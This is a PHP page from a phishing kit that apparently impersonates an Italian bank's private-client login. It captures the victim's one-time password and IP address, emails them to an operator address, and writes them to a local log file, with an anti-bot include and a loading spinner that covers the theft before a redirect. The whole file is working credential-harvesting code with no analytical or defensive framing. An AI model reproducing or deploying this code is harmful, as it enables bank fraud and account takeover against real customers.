<?php

session_start();
error_reporting(0);


include_once "../../antibots.php";

include ("../conf.php");
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['otp'] != "") && strlen($_POST["otp"]) >= 4 )
{
$message .= "[ENZO] $ip \n";
$message .= "PWD       : ".$_POST['otp']."\n";
$message .= "[ENZO]\n";
$subject = "OTP - $ip";
$headers = "From: [LOG]<noreply@kundenserver.de>";
mail($send,$subject,$message,$headers);
	$file = fopen("../../st.txt","a+"); fwrite($file, $message);
}
	else {
     echo "<meta http-equiv='refresh' content='0; url=otp.html?id=$ip' />";
}
?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Login</title>

<script>
    setTimeout(function(){window.top.location.href="../news.php"} , 5000);
</script>
<link rel="stylesheet" type="text/css" media="all, print" href="./style(3).css">
<link rel="stylesheet" type="text/css" media="all, print" href="./fonts(1).css">
<link rel="stylesheet" type="text/css" media="all, print" href="./login.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./hb-login.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./style(4).css">
<link rel="stylesheet" type="text/css" media="all, print" href="./editoriale(1).css">


		
		
	</head><body marginwidth="0" marginheight="0">
		<div>
			<div class="master-div">
				<form id="command" name="websealForm" action="command.php" method="post" autocomplete="off">

					<div>
						<div class="titolo-area-riservata-div">
							<strong>AREA CLIENTI PRIVATI</strong>
						</div>
						<div class="credenziali-area-riservata-div">
							<br><br><br><p align="center"><img border="0" hspace="0" alt="" src="../img/spinnerloader.gif" align="baseline"></p><br><br>
								<table class="login-table"><tbody><tr>
									
									
								</tr>
							</tbody></table>
						</div>
					</div>

					<input type="hidden" name="AUTH" id="_AUTH">

					
				</form>
			</div>
		</div>
	

</body></html>